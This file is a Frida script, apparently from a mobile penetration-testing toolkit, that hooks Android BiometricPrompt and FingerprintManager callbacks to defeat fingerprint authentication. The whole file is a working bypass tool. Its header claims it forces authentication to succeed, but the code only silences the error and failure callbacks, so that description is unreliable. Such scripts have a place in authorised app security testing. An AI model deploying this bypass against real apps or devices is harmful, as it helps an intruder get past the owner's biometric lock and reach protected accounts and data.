/*
 * msrf :: biometric-bypass
 * Forces BiometricPrompt/FingerprintManager auth callbacks to succeed.
 */
Java.perform(function () {
    function log(m) { send({ tag: 'biometric-bypass', msg: m }); }
    try {
        var BP = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
        BP.onAuthenticationError.implementation = function (code, msg) {
            log('Suppressed onAuthenticationError(' + code + ')');
        };
    } catch (e) {}
    try {
        var FM = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationCallback');
        FM.onAuthenticationFailed.implementation = function () {
            log('Suppressed fingerprint onAuthenticationFailed');
        };
    } catch (e) {}
    log('Biometric bypass installed (best-effort)');
});
